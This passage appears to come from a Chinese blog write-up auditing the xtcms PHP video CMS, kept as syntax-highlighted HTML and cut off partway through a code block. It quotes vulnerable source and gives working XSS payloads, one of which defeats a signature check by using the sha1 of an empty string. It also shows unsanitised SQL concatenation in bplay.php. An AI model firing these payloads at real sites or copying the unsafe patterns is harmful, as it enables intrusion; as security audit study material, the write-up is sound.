attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>submit<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>search<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>btn btn-info<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>search<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>查找<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>btn btn-info<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>cms_dao.php<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'?cpass='</span><span class=\"token operator\">.</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"id\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span class=\"token delimiter important\">?></span></span><span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>span</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>icon-plus-square<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>导出<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>span</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>关注</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">value=\"<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">echo</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"id\"</span><span class=\"token punctuation\">]</span> <span class=\"token delimiter important\">?></span></span>\"<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>发现这里参数<code>id</code>没有什么防护，虽然开头涉及了<code>inc.php</code>，但那个是防护SQL注入的，不影响xss。我们这里如果能够闭合语句的话，似乎就可以触发XSS了。payload</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">id=\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span>\n//此时的语句就是 value=\"<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\">&lt;script>alert(1)&lt;/script> ?>\"</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>结果如下<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151950.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"wx-api-php\"><a href=\"#wx-api-php\" class=\"headerlink\" title=\"wx_api.php\"></a>wx_api.php</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">wechatCallbackapiTest</span>\n<span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">valid</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$echoStr</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"echostr\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token function\">checkSignature</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        \t<span class=\"token keyword\">echo</span> <span class=\"token variable\">$echoStr</span><span class=\"token punctuation\">;</span>\n        \t<span class=\"token keyword\">exit</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>可以发现这里的参<code>$_GET[&#39;echostr&#39;]</code>不存在防护，在传入后经过一个if语句直接进行了输出，我们跟进一下这个if语句了的<code>checkSignature</code>函数查看一下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">private</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">checkSignature</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n       <span class=\"token comment\">// you must define TOKEN by yourself</span>\n       <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">defined</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"TOKEN\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n           <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Exception</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'TOKEN is not defined!'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n       <span class=\"token punctuation\">&#125;</span>\n       \n       <span class=\"token variable\">$signature</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"signature\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n       <span class=\"token variable\">$timestamp</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"timestamp\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n       <span class=\"token variable\">$nonce</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"nonce\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n       \t\t\n\t<span class=\"token variable\">$token</span> <span class=\"token operator\">=</span> <span class=\"token constant\">TOKEN</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$tmpArr</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$token</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$timestamp</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$nonce</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n       <span class=\"token comment\">// use SORT_STRING rule</span>\n\t<span class=\"token function\">sort</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$tmpArr</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">SORT_STRING</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$tmpStr</span> <span class=\"token operator\">=</span> <span class=\"token function\">implode</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$tmpArr</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$tmpStr</span> <span class=\"token operator\">=</span> <span class=\"token function\">sha1</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$tmpStr</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\n\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$tmpStr</span> <span class=\"token operator\">==</span> <span class=\"token variable\">$signature</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token keyword\">return</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>发现这里大概是个检验token的，传个空对应的md5值应该就可以，尝试xss<br>payload</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">?</span>echostr<span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>script<span class=\"token operator\">></span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'别当舔狗'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span><span class=\"token operator\">&amp;</span>signature<span class=\"token operator\">=</span>da39a3ee5e6b4b0d3255bfef95601890afd80709<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151096.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"SQL\"><a href=\"#SQL\" class=\"headerlink\" title=\"SQL\"></a>SQL</h2><h3 id=\"bplay-php\"><a href=\"#bplay-php\" class=\"headerlink\" title=\"bplay.php\"></a>bplay.php</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> \n<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'system/inc.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//载入全局配置文件</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//关闭错误报告</span>\n<span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'select * from xtcms_vod where d_id = '</span><span class=\"token operator\">.</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'play'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">' '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token variable\">$row</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_fetch_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token variable\">$d_id</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'d_id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$d_name</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'d_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$d_jifen</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'d_jifen'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$d_user</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'d_user'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$d_parent</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'d_parent'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$d_picture</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'d_picture'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$d_content</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'d_content'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$d_scontent</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'d_scontent'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$d_seoname</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'d_seoname'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$d_keywords</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'d_keywords'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$d_description</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'d_description'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$d_player</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'d_player'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$d_title</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$d_seoname</span> <span class=\"token operator\">==</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token variable\">$d_name</span> <span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">' - '</span><span class=\"token operator\">.</span><span class=\"token variable\">$xtcms_name</span> <span class=\"token punctuation\">:</span> <span class=\"token variable\">$d_seoname</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">' - '</span><span class=\"token operator\">.</span><span class=\"token variable\">$d_name</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">' - '</span><span class=\"token operator\">.</span><span class=\"token variable\">$xtcms_name</span> <span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token keyword\">die</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'您访问的详情不存在'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$result1</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'select * from xtcms_vod_class where c_id='</span><span class=\"token operator\">.</span><span class=\"token variable\">$d_parent</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">' order by c_id asc'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$row1</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_fetch_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$result1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n<span class=\"token variable\">$c_hide</span><span class=\"token operator\">=</span><span class=\"token variable\">$row1</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c_hide'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c_hide</span><span class=\"token operator\">></span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token function\">alert_href</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'请注册会员登录后观看'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">''</span><span class=\"token operator\">.</span><span class=\"token variable\">$xtcms_domain</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'ucenter'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'select * from xtcms_user where u_name=\"'</span><span class=\"token operator\">.</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user_name'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\"'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//查询会员积分</span>\n     <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$row</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_fetch_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t <span class=\"token variable\">$u_group</span><span class=\"token operator\">=</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u_group'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//到期时间</span>\n     <span class=\"token punctuation\">&#125;</span>\n <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$u_group</span><span class=\"token operator\">&lt;=</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token comment\">//如果会员组</span>\n <span class=\"token function\">alert_href</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'对不起,您不能观看会员视频，请升级会员！'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">''</span><span class=\"token operator\">.</span><span class=\"token variable\">$xtcms_domain</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'ucenter/mingxi.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n <span class=\"token punctuation\">&#125;</span> \n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'system/shoufei.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$d_jifen</span><span class=\"token operator\">></span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token comment\">//积分大于0,普通会员收费</span>\n\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token function\">alert_href</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'请注册会员登录后观看'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">''</span><span class=\"token operator\">.</span><span class=\"token variable\">$xtcms_domain</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'ucenter'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'select * from xtcms_user where u_name=\"'</span><span class=\"token operator\">.</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user_name'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\"'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//查询会员积分</span>\n     <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$row</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_fetch_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n     <span class=\"token variable\">$u_points</span><span class=\"token operator\">=</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u_points'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//会员积分</span>\n     <span class=\"token variable\">$u_plays</span><span class=\"token operator\">=</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u_plays'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//会员观看记录</span>\n     <span class=\"token variable\">$u_end</span><span class=\"token operator\">=</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u_end'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//到期时间</span>\n\t <span class=\"token variable\">$u_group</span><span class=\"token operator\">=</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u_group'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//到期时间</span>\n     <span class=\"token punctuation\">&#125;</span>\t\n\n\t     <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$u_group</span><span class=\"token operator\">&lt;=</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token comment\">//如果会员组</span>\n     <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$d_jifen</span><span class=\"token operator\">></span><span class=\"token variable\">$u_points</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t <span class=\"token function\">alert_href</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'对不起,您的积分不够，无法观看收费数据，请推荐本站给您的好友、赚取更多积分'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">''</span><span class=\"token operator\">.</span><span class=\"token variable\">$xtcms_domain</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'ucenter/yaoqing.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>  <span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">strpos</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\",\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$u_plays</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$d_id</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span> \n\n\t<span class=\"token punctuation\">&#125;</span>\t\n\t<span class=\"token comment\">//有观看记录不扣点</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n\n   <span class=\"token variable\">$uplays</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\",\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$u_plays</span><span class=\"token operator\">.</span><span class=\"token variable\">$d_id</span><span class=\"token punctuation\">;</span>\n   <span class=\"token variable\">$uplays</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\",,\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\",\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$uplays</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   <span class=\"token variable\">$_data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u_points'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span><span class=\"token variable\">$u_points</span><span class=\"token operator\">-</span><span class=\"token variable\">$d_jifen</span><span class=\"token punctuation\">;</span>\n   <span class=\"token variable\">$_data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u_plays'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span><span class=\"token variable\">$uplays</span><span class=\"token punctuation\">;</span>\n   <span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'update xtcms_user set '</span><span class=\"token operator\">.</span><span class=\"token function\">arrtoupdate</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_data</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">' where u_name=\"'</span><span class=\"token operator\">.</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user_name'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\"'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\n<span class=\"token function\">alert_href</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'您成功支付'</span><span class=\"token operator\">.</span><span class=\"token variable\">$d_jifen</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'积分,请重新打开视频观看!'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">''</span><span class=\"token operator\">.</span><span class=\"token variable\">$xtcms_domain</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'bplay.php?play='</span><span class=\"token operator\">.</span><span class=\"token variable\">$d_id</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\t\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token 